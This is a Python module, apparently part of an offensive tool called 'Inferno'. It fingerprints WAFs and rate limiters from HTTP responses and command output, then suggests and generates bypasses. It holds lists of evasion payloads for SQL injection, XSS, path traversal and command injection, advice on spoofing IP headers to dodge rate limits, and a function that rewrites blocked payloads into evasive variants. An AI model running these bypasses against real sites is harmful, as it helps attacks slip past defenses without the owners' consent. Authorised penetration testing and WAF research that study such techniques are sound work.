"""
Response Analyzer for Inferno.

Analyzes HTTP responses and command outputs to understand WHY attacks fail.
Detects WAFs, filters, and protection mechanisms, then suggests bypasses.

Key features:
- WAF signature detection (CloudFlare, AWS WAF, ModSecurity, etc.)
- Filter pattern identification
- Bypass technique suggestion
- Rate limit detection
- Block reason analysis
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

import structlog

logger = structlog.get_logger(__name__)


class BlockType(str, Enum):
    """Types of blocking mechanisms."""

    WAF = "waf"  # Web Application Firewall
    RATE_LIMIT = "rate_limit"  # Rate limiting
    INPUT_VALIDATION = "input_validation"  # Application-level validation
    IP_BLOCK = "ip_block"  # IP-based blocking
    AUTH_REQUIRED = "auth_required"  # Authentication needed
    PERMISSION_DENIED = "permission_denied"  # Authorization failure
    NOT_FOUND = "not_found"  # Resource doesn't exist
    SERVER_ERROR = "server_error"  # Server-side error
    UNKNOWN = "unknown"  # Unknown block type


class WAFType(str, Enum):
    """Known WAF types."""

    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AKAMAI = "akamai"
    MODSECURITY = "modsecurity"
    F5_BIGIP = "f5_bigip"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    WORDFENCE = "wordfence"
    GENERIC = "generic"
    NONE = "none"


@dataclass
class BlockAnalysis:
    """Analysis result of a blocked request."""

    is_blocked: bool
    block_type: BlockType
    waf_type: WAFType = WAFType.NONE
    blocked_pattern: str | None = None  # What triggered the block
    confidence: float = 1.0
    suggested_bypasses: list[str] = field(default_factory=list)
    evidence: str | None = None  # Evidence of the block
    metadata: dict[str, Any] = field(default_factory=dict)


class ResponseAnalyzer:
    """
    Analyze responses to understand blocking mechanisms.

    When a payload is blocked, this analyzer determines:
    1. What blocked it (WAF, rate limit, validation)
    2. What pattern triggered the block
    3. What bypass techniques to try
    """

    # WAF signature patterns
    WAF_SIGNATURES: dict[WAFType, list[dict[str, Any]]] = {
        WAFType.CLOUDFLARE: [
            {"pattern": r"cf-ray", "location": "header", "confidence": 0.95},
            {"pattern": r"cloudflare", "location": "body", "confidence": 0.9},
            {"pattern": r"__cfduid", "location": "cookie", "confidence": 0.9},
            {"pattern": r"Attention Required! \| Cloudflare", "location": "body", "confidence": 0.99},
            {"pattern": r"cf-mitigated", "location": "header", "confidence": 0.95},
        ],
        WAFType.AWS_WAF: [
            {"pattern": r"awselb", "location": "header", "confidence": 0.8},
            {"pattern": r"x-amz-", "location": "header", "confidence": 0.7},
            {"pattern": r"Request blocked", "location": "body", "confidence": 0.6},
        ],
        WAFType.AKAMAI: [
            {"pattern": r"akamai", "location": "header", "confidence": 0.9},
            {"pattern": r"AkamaiGHost", "location": "header", "confidence": 0.95},
            {"pattern": r"Reference #\d+\.\w+\.\d+", "location": "body", "confidence": 0.85},
        ],
        WAFType.MODSECURITY: [
            {"pattern": r"mod_security", "location": "body", "confidence": 0.95},
            {"pattern": r"NAXSI|NAXSI_EXLOG", "location": "header", "confidence": 0.9},
            {"pattern": r"This error was generated by Mod_Security", "location": "body", "confidence": 0.99},
            {"pattern": r"rules\.x-sec|X-Mod-Security", "location": "header", "confidence": 0.9},
        ],
        WAFType.F5_BIGIP: [
            {"pattern": r"BigIP|BIGipServer", "location": "header", "confidence": 0.95},
            {"pattern": r"F5-TrafficShield", "location": "header", "confidence": 0.95},
            {"pattern": r"The requested URL was rejected", "location": "body", "confidence": 0.8},
        ],
        WAFType.IMPERVA: [
            {"pattern": r"incap_ses|visid_incap", "location": "cookie", "confidence": 0.95},
            {"pattern": r"Incapsula", "location": "body", "confidence": 0.95},
            {"pattern": r"X-Iinfo", "location": "header", "confidence": 0.9},
        ],
        WAFType.SUCURI: [
            {"pattern": r"x-sucuri-id", "location": "header", "confidence": 0.95},
            {"pattern": r"Sucuri Website Firewall", "location": "body", "confidence": 0.99},
            {"pattern": r"sucuri\.net/privacy-policy", "location": "body", "confidence": 0.95},
        ],
        WAFType.WORDFENCE: [
            {"pattern": r"wordfence", "location": "body", "confidence": 0.95},
            {"pattern": r"Your access to this site has been limited", "location": "body", "confidence": 0.9},
            {"pattern": r"wfwaf-authcookie", "location": "cookie", "confidence": 0.95},
        ],
    }

    # Block response patterns
    BLOCK_PATTERNS: dict[BlockType, list[dict[str, Any]]] = {
        BlockType.WAF: [
            {"pattern": r"access denied", "confidence": 0.8},
            {"pattern": r"blocked", "confidence": 0.7},
            {"pattern": r"forbidden", "confidence": 0.7},
            {"pattern": r"security violation", "confidence": 0.9},
            {"pattern": r"malicious", "confidence": 0.85},
            {"pattern": r"attack detected", "confidence": 0.9},
            {"pattern": r"suspicious activity", "confidence": 0.85},
        ],
        BlockType.RATE_LIMIT: [
            {"pattern": r"rate limit", "confidence": 0.95},
            {"pattern": r"too many requests", "confidence": 0.95},
            {"pattern": r"throttl", "confidence": 0.85},
            {"pattern": r"slow down", "confidence": 0.8},
            {"pattern": r"retry.after", "confidence": 0.9},
        ],
        BlockType.INPUT_VALIDATION: [
            {"pattern": r"invalid (input|parameter|value)", "confidence": 0.9},
            {"pattern": r"validation (failed|error)", "confidence": 0.9},
            {"pattern": r"must be a valid", "confidence": 0.85},
            {"pattern": r"is not allowed", "confidence": 0.8},
            {"pattern": r"illegal character", "confidence": 0.9},
        ],
    }

    # Bypass techniques by WAF type
    WAF_BYPASSES: dict[WAFType, list[str]] = {
        WAFType.CLOUDFLARE: [
            "origin_ip_discovery",
            "unicode_normalization",
            "chunked_encoding",
            "http2_smuggling",
            "case_variation",
        ],
        WAFType.AWS_WAF: [
            "json_smuggling",
            "case_mixing",
            "parameter_pollution",
            "content_type_bypass",
            "unicode_encoding",
        ],
        WAFType.MODSECURITY: [
            "comment_injection",
            "encoding_chains",
            "version_specific_bypass",
            "rule_id_specific",
            "multipart_bypass",
        ],
        WAFType.F5_BIGIP: [
            "parameter_pollution",
            "chunked_encoding",
            "header_injection",
            "case_mixing",
        ],
        WAFType.IMPERVA: [
            "slow_request",
            "chunked_encoding",
            "unicode_encoding",
            "multipart_bypass",
        ],
        WAFType.GENERIC: [
            "url_encoding",
            "double_encoding",
            "unicode_encoding",
            "case_mixing",
            "comment_injection",
            "parameter_pollution",
            "null_byte",
            "newline_injection",
            "content_type_manipulation",
        ],
    }

    # Common filtered patterns and their bypasses
    FILTER_BYPASSES: dict[str, list[str]] = {
        # SQL keywords
        r"select|union|from": [
            "SeLeCt", "UNION/**/", "sel%65ct", "se%00lect",
            "/*!SELECT*/", "UNION%0a%0d", "uni%6fn",
        ],
        r"'|\"": [
            "%27", "%22", "\\x27", "\\x22", "%bf%27",
            "concat(char(39))", "0x27",
        ],
        r"--|#|/\*": [
            "%23", "%2d%2d", "--+", "-- -", "/**_**/",
        ],
        # XSS patterns
        r"<script|javascript:|on\w+=": [
            "<ScRiPt>", "<svg/onload=", "<img src=x onerror=",
            "java%0ascript:", "<body onload=", "&#60;script&#62;",
        ],
        r"alert|confirm|prompt": [
            "al\x65rt", "al%65rt", "confirm`1`", "[].constructor.constructor('return alert(1)')()",
        ],
        # Path traversal
        r"\.\./|\.\.\\": [
            "..%2f", "..%5c", "%2e%2e/", "..%252f",
            "....//", "..\\..\\",
        ],
        # Command injection
        r";|\||&|`|\$\(": [
            "%3b", "%7c", "%26", "%60",
            "${IFS}", "$IFS$9", "\n", "\r\n",
        ],
    }

    def __init__(self) -> None:
        """Initialize the response analyzer."""
        self._compiled_waf: dict[WAFType, list[tuple[re.Pattern, str, float]]] = {}
        for waf_type, patterns in self.WAF_SIGNATURES.items():
            self._compiled_waf[waf_type] = [
                (re.compile(p["pattern"], re.I), p["location"], p["confidence"])
                for p in patterns
            ]

        self._compiled_blocks: dict[BlockType, list[tuple[re.Pattern, float]]] = {}
        for block_type, patterns in self.BLOCK_PATTERNS.items():
            self._compiled_blocks[block_type] = [
                (re.compile(p["pattern"], re.I), p["confidence"])
                for p in patterns
            ]

        self._compiled_filters: dict[re.Pattern, list[str]] = {
            re.compile(pattern, re.I): bypasses
            for pattern, bypasses in self.FILTER_BYPASSES.items()
        }

    def analyze(
        self,
        body: str,
        status_code: int,
        headers: dict[str, str] | None = None,
        original_payload: str | None = None,
    ) -> BlockAnalysis:
        """
        Analyze a response to determine if/how request was blocked.

        Args:
            body: Response body
            status_code: HTTP status code
            headers: Response headers
            original_payload: The payload that was sent (for filter detection)

        Returns:
            BlockAnalysis with details and bypass suggestions
        """
        headers = headers or {}

        # Quick check for obvious non-blocks
        if status_code in (200, 201, 204, 301, 302, 304):
            # Check for soft blocks (200 with block message)
            if not self._is_soft_block(body):
                return BlockAnalysis(
                    is_blocked=False,
                    block_type=BlockType.UNKNOWN,
                )

        # Detect WAF first
        waf_type, waf_confidence, waf_evidence = self._detect_waf(body, headers)

        # Determine block type
        block_type, block_confidence = self._determine_block_type(
            body, status_code, headers
        )

        # If not blocked, return early
        if block_type == BlockType.NOT_FOUND and status_code == 404:
            return BlockAnalysis(
                is_blocked=False,
                block_type=BlockType.NOT_FOUND,
            )

        # Analyze what pattern was filtered
        blocked_pattern = None
        if original_payload:
            blocked_pattern = self._identify_blocked_pattern(original_payload, body)

        # Get bypass suggestions
        bypasses = self._suggest_bypasses(
            waf_type=waf_type,
            block_type=block_type,
            blocked_pattern=blocked_pattern,
        )

        is_blocked = block_type in (
            BlockType.WAF,
            BlockType.RATE_LIMIT,
            BlockType.INPUT_VALIDATION,
            BlockType.IP_BLOCK,
            BlockType.PERMISSION_DENIED,
        ) or status_code in (403, 429, 503)

        analysis = BlockAnalysis(
            is_blocked=is_blocked,
            block_type=block_type,
            waf_type=waf_type,
            blocked_pattern=blocked_pattern,
            confidence=max(waf_confidence, block_confidence),
            suggested_bypasses=bypasses,
            evidence=waf_evidence,
            metadata={
                "status_code": status_code,
                "headers_checked": list(headers.keys()),
            },
        )

        if is_blocked:
            logger.info(
                "block_detected",
                block_type=block_type.value,
                waf_type=waf_type.value,
                status_code=status_code,
                bypasses_suggested=len(bypasses),
            )

        return analysis

    def _is_soft_block(self, body: str) -> bool:
        """Check for soft blocks (200 status but blocked content)."""
        soft_block_patterns = [
            r"access denied",
            r"request blocked",
            r"security check",
            r"captcha",
            r"challenge-form",
            r"please verify",
        ]
        body_lower = body.lower()
        return any(re.search(p, body_lower) for p in soft_block_patterns)

    def _detect_waf(
        self,
        body: str,
        headers: dict[str, str],
    ) -> tuple[WAFType, float, str | None]:
        """Detect which WAF is blocking."""
        best_match = WAFType.NONE
        best_confidence = 0.0
        evidence = None

        headers_str = str(headers).lower()
        body_lower = body.lower()

        for waf_type, patterns in self._compiled_waf.items():
            for pattern, location, confidence in patterns:
                search_text = ""
                if location == "header":
                    search_text = headers_str
                elif location == "body":
                    search_text = body_lower
                elif location == "cookie":
                    search_text = headers.get("Set-Cookie", "") + headers.get("Cookie", "")

                if pattern.search(search_text):
                    if confidence > best_confidence:
                        best_confidence = confidence
                        best_match = waf_type
                        evidence = f"Matched {waf_type.value} signature: {pattern.pattern}"

        return best_match, best_confidence, evidence

    def _determine_block_type(
        self,
        body: str,
        status_code: int,
        headers: dict[str, str],
    ) -> tuple[BlockType, float]:
        """Determine the type of block."""
        body_lower = body.lower()

        # Status code based detection
        status_blocks = {
            403: (BlockType.WAF, 0.7),
            429: (BlockType.RATE_LIMIT, 0.95),
            401: (BlockType.AUTH_REQUIRED, 0.9),
            503: (BlockType.RATE_LIMIT, 0.6),  # Could be rate limit or overload
            500: (BlockType.SERVER_ERROR, 0.7),
            404: (BlockType.NOT_FOUND, 0.9),
        }

        if status_code in status_blocks:
            base_type, base_confidence = status_blocks[status_code]
        else:
            base_type, base_confidence = BlockType.UNKNOWN, 0.5

        # Override with pattern-based detection
        best_type = base_type
        best_confidence = base_confidence

        for block_type, patterns in self._compiled_blocks.items():
            for pattern, confidence in patterns:
                if pattern.search(body_lower):
                    if confidence > best_confidence:
                        best_confidence = confidence
                        best_type = block_type

        # Check for rate limit headers
        rate_limit_headers = ["x-ratelimit-remaining", "retry-after", "x-rate-limit"]
        for header in rate_limit_headers:
            if any(h.lower() == header for h in headers):
                if headers.get("x-ratelimit-remaining", "1") == "0":
                    return BlockType.RATE_LIMIT, 0.95

        return best_type, best_confidence

    def _identify_blocked_pattern(
        self,
        payload: str,
        response_body: str,
    ) -> str | None:
        """Identify which part of the payload was blocked."""
        # Check if any known filter patterns match
        for pattern, _ in self._compiled_filters.items():
            match = pattern.search(payload)
            if match:
                # See if the response mentions it or a related block
                return match.group(0)

        return None

    def _suggest_bypasses(
        self,
        waf_type: WAFType,
        block_type: BlockType,
        blocked_pattern: str | None,
    ) -> list[str]:
        """Suggest bypass techniques based on analysis."""
        bypasses = []

        # WAF-specific bypasses
        if waf_type != WAFType.NONE:
            bypasses.extend(self.WAF_BYPASSES.get(waf_type, []))
        bypasses.extend(self.WAF_BYPASSES.get(WAFType.GENERIC, []))

        # Pattern-specific bypasses
        if blocked_pattern:
            for pattern, bypass_list in self._compiled_filters.items():
                if pattern.search(blocked_pattern):
                    bypasses.extend(bypass_list)

        # Block type specific
        if block_type == BlockType.RATE_LIMIT:
            bypasses.extend([
                "x_forwarded_for_rotation",
                "x_real_ip_spoofing",
                "different_endpoint",
                "mobile_api_endpoint",
                "slow_request",
            ])
        elif block_type == BlockType.INPUT_VALIDATION:
            bypasses.extend([
                "type_juggling",
                "null_byte_injection",
                "encoding_bypass",
                "unicode_normalization",
            ])

        # Remove duplicates while preserving order
        seen = set()
        unique_bypasses = []
        for b in bypasses:
            if b not in seen:
                seen.add(b)
                unique_bypasses.append(b)

        return unique_bypasses

    def analyze_command_output(
        self,
        stdout: str,
        stderr: str,
        exit_code: int,
        command: str,
    ) -> BlockAnalysis:
        """
        Analyze command output for blocks/failures.

        Args:
            stdout: Standard output
            stderr: Standard error
            exit_code: Command exit code
            command: The command that was run

        Returns:
            BlockAnalysis for command execution
        """
        combined = f"{stdout}\n{stderr}".lower()

        # Check for connection blocks
        connection_blocks = [
            (r"connection refused", BlockType.IP_BLOCK),
            (r"connection timed out", BlockType.RATE_LIMIT),
            (r"reset by peer", BlockType.WAF),
            (r"403 forbidden", BlockType.WAF),
            (r"rate limit", BlockType.RATE_LIMIT),
        ]

        for pattern, block_type in connection_blocks:
            if re.search(pattern, combined):
                return BlockAnalysis(
                    is_blocked=True,
                    block_type=block_type,
                    evidence=f"Command output contains: {pattern}",
                    suggested_bypasses=self._suggest_bypasses(
                        WAFType.GENERIC, block_type, None
                    ),
                )

        # Check for WAF in command output
        for waf_type, patterns in self._compiled_waf.items():
            for pattern, _, confidence in patterns:
                if pattern.search(combined):
                    return BlockAnalysis(
                        is_blocked=True,
                        block_type=BlockType.WAF,
                        waf_type=waf_type,
                        confidence=confidence,
                        suggested_bypasses=self.WAF_BYPASSES.get(waf_type, []),
                    )

        return BlockAnalysis(
            is_blocked=exit_code != 0,
            block_type=BlockType.UNKNOWN if exit_code != 0 else BlockType.UNKNOWN,
        )

    def get_bypass_payloads(
        self,
        original_payload: str,
        analysis: BlockAnalysis,
    ) -> list[str]:
        """
        Generate bypass variations of the original payload.

        Args:
            original_payload: The payload that was blocked
            analysis: The block analysis

        Returns:
            List of bypass payload variations
        """
        variations = [original_payload]

        # Check which transformations to apply based on blocked pattern
        if analysis.blocked_pattern:
            for pattern, bypass_list in self._compiled_filters.items():
                if pattern.search(original_payload):
                    for bypass in bypass_list[:3]:  # Top 3 bypasses
                        try:
                            # Simple replacement (may need more sophisticated handling)
                            match = pattern.search(original_payload)
                            if match:
                                new_payload = (
                                    original_payload[:match.start()] +
                                    bypass +
                                    original_payload[match.end():]
                                )
                                variations.append(new_payload)
                        except Exception:
                            pass

        # Apply general encoding transformations
        encoding_funcs = [
            lambda s: s.replace("'", "%27").replace('"', "%22"),  # URL encode quotes
            lambda s: s.replace("<", "%3c").replace(">", "%3e"),  # URL encode brackets
            lambda s: s.replace(" ", "+"),  # Plus encoding for spaces
            lambda s: s.replace(" ", "%20"),  # Percent encoding for spaces
            lambda s: s.replace("select", "SeLeCt").replace("union", "UnIoN"),  # Case mix
        ]

        for func in encoding_funcs:
            try:
                new_payload = func(original_payload)
                if new_payload not in variations:
                    variations.append(new_payload)
            except Exception:
                pass

        return variations[:10]  # Return top 10 variations


# Global singleton
_response_analyzer: ResponseAnalyzer | None = None


def get_response_analyzer() -> ResponseAnalyzer:
    """Get the global response analyzer instance."""
    global _response_analyzer
    if _response_analyzer is None:
        _response_analyzer = ResponseAnalyzer()
    return _response_analyzer
